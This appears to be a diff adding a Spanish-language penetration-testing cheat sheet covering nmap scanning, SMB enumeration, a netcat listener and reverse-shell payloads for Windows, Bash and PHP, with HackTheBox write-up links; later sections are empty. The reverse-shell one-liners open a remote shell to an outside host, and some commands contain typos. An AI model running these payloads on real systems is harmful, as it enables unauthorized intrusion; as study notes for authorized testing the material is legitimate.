@@ -1,0 +1,151 @@
+﻿FASE DE LA AUDITORÍA 
+
+RECONOCIMIENTO            Recopilar información
+ENUMERACIÓN                  Escaneo de puertos, análisis de vulnerabilidades
+EXPLOTACIÓN                   Acceso al sistema
+POST EXPLOTACIÓN        Escalada de privilegios, persistencia, pivoting
+REPORTES, INFORMES    Redacción de informes
+
+
+FASE DE ENUMERACIÓN
+
+NMAP
+
+nmap [Parámetro]
+
+-p     	                   # Para indicar un puerto.
+-p1-100	       # Escanea un rango de puertos.
+-p-    	                   # Para indicar todos los puertos.
+--open                    # Para indicar puertos abiertos.
+-sS                         # Hace un escaneo sigiloso.
+-T5       	       # Hacer un escaneo agresivo.
+-n     	                  # No aplica la resolución DNS.
+-Pn        	      # Para que no aplique un ping
+-v         	      # Para mostrar info por consola
+-O        	      # Para indicar que S.O está usando.
+-sV       	      # Para indicar el servicio y la versión.
+-sC      	      # Para aplicar un script para encontrar vulnerabilidades.
+-oN {.txt}               # Para guardar escaneos en un archivo de texto plano.
+-sn         	      # Para hacer un escaneo de redes
+-sn [ip/24]            #Para listar todos los dispositivos de red,
+-sP [ip]                 #
+
+Comandos 
+
+nmap -p- --open -sS T5 -vvv -n -Pn  [ip] -oN scanports.txt
+
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  [ip] -oN scanports.txt
+ [ip]
+nmap -p  -sV -sC -O   [ip] -oN scansv.txt 
+
+nmap -p  -sCV - O  [ip] -oN scansv.txt 
+
+---------------------------------------------------------------------------------------------------------------------------
+
+PUERTO      445
+SERVICIO   SMB
+
+CRACKMAPEXEC
+
+crackmapexec smb [ip]
+
+
+ SMBMAP 
+smbmap -H [ip] -u ‘user’  -p ‘pass’
+smbmap -H [ip] -u 'null'
+smbmap -H [ip] -r /share
+
+SMBCLIENT  
+
+smbclient  //[ip]/ -U %pass
+smbclient -L  //[ip] -N
+smbclient -N//[ip]/share 
+
+
+---------------------------------------------------------------------------------------------------------------
+
+FASE DE  EXPLOTACIÓN O  ACCESO AL SISTEMA
+
+EXPLOITS
+
+NETCAT 
+
+sudo apt install rlwrap  // Instalar rlwrap
+sudo apt install netcat  // Instalar netcat
+nc -h // Verifico la versión.
+sudo rlwrap nc -lvnp [port]  // Me pongo por escucha por un puerto 
+
+PYLOAD
+nc.exe -e cmd.exe IP [port]    // Windows
+/bin/bash -i >& /dev/tcp/IP/[port] 0>&1 //Bash  // Linux
+php -r '$sock=fsockopen("IP",[port]);exec("/bin/bash -i<&3 >&3 2>&3");' //PHP
+
+
+---------------------------------------------------------------------------------------------------------------
+
+FASE DE POST EXPLOTACIÓN 
+
+ESCALAR PRIVILEGIOS
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------
+
+
+FASE DE REPORTES, INFORMES Y DOCUMENTACIÓN  
+
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+https://sckull.github.io/categories/windows/
+
+https://byte-mind.net/hackthebox-machines-timelapse-writeup/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+- burp suite
+- hydra
+- sqlmap
+- wfuzz
+
+
+
+
+
